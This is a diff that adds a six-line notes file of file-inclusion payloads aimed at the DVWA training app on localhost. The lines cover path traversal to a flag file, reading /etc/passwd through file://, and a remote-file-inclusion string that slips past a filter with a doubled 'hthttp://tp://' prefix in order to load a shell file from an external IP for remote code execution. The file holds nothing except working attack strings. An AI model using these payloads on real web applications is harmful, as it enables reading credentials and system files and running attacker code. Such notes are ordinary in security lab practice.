@@ -1,0 +1,6 @@
+http://127.0.0.1:42001/vulnerabilities/fi/?page=../../hackable/flags/fi.php
+../../hackable/uploads/RFI-shell.txt shell 
+?page=hthttp://tp://18.215.230.19/RFI-shell.txt RCE
+http://127.0.0.1:42001/vulnerabilities/fi/?page=file:///etc/passwd high LFI
+
+
